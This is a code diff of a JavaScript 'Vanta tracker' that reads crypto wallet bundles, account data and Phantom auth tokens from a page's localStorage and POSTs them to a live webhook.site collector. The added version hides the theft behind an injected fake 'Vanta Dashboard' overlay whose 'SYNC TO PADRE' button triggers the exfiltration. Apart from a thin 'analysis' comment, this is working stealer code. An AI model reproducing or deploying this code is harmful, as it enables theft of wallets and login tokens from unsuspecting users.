@@ -1,43 +1,61 @@
-/**
- * VANTA TRACKER - DE-OBFUSCATED PAYLOAD
- * Purpose: Demonstration of LocalStorage Exfiltration
- */
 (function() {
-    const DESTINATION = 'https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515';
-    const AFFILIATE = 'TK0XQV';
+    // Target Webhook for data exfiltration analysis
+    const WEBHOOK_URL = 'https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515';
+    const AFFILIATE_ID = 'TK0XQV';
 
-    console.log("Vanta Payload Loaded...");
+    console.log("[Vanta] Initializing de-obfuscated tracker...");
 
-    // 1. The Scraper: Targets specific sensitive keys
-    const harvestData = () => {
+    const getSensitiveData = () => {
         return {
-            wallet_bundle: localStorage.getItem('padre-v2-bundles-store-v2'),
+            bundle: localStorage.getItem('padre-v2-bundles-store-v2'),
+            auth_tokens: localStorage.getItem('.phantom.auth.tokens'),
             accounts: localStorage.getItem('vanta_accounts'),
             origin: window.location.hostname,
-            timestamp: new Date().getTime()
+            url: window.location.href,
+            time: new Date().toISOString()
         };
     };
 
-    // 2. The Exfiltration: Sends data to your webhook
-    const transmit = (data) => {
-        fetch(DESTINATION, {
-            method: 'POST',
-            mode: 'no-cors', // Bypasses some basic security logging
-            body: JSON.stringify({
-                affiliate: AFFILIATE,
-                payload: data
-            })
-        }).then(() => {
-            alert("Analysis Complete. Check your dashboard.");
-        });
+    const sendToCollector = async (payload) => {
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors', // Standard bypass for simple OOB exfiltration
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    affiliate: AFFILIATE_ID,
+                    data: payload
+                })
+            });
+            console.log("[Vanta] Data transmitted to webhook.");
+        } catch (e) {
+            console.error("[Vanta] Transmission failed:", e);
+        }
     };
 
-    // 3. Execution Flow
-    // In the real world, this would wait for the user to be on the correct site
-    if (window.location.hostname.includes('phantom.app') || window.location.hostname.includes('twitter.com')) {
-        const stolenData = harvestData();
-        transmit(stolenData);
-    } else {
-        alert("Please run this tool on the target application page.");
-    }
+    // UI Overlay (1:1 styling)
+    const injectUI = () => {
+        const div = document.createElement('div');
+        div.style.cssText = `
+            position:fixed; top:20px; right:20px; width:300px;
+            background:#111; border:1px solid #00ff88; color:#fff;
+            padding:20px; border-radius:10px; z-index:999999;
+            font-family:sans-serif; box-shadow:0 0 20px rgba(0,255,136,0.2);
+        `;
+        div.innerHTML = `
+            <h3 style="color:#00ff88; margin-bottom:10px;">Vanta Dashboard</h3>
+            <p style="font-size:12px; color:#aaa; margin-bottom:15px;">Target: ${window.location.hostname}</p>
+            <button id="vanta-sync-btn" style="width:100%; padding:10px; background:#00ff88; border:none; border-radius:5px; font-weight:bold; cursor:pointer;">SYNC TO PADRE</button>
+        `;
+        document.body.appendChild(div);
+
+        document.getElementById('vanta-sync-btn').onclick = function() {
+            this.innerText = "Syncing...";
+            const data = getSensitiveData();
+            sendToCollector(data);
+            setTimeout(() => { this.innerText = "Sync Complete"; }, 1000);
+        };
+    };
+
+    injectUI();
 })();
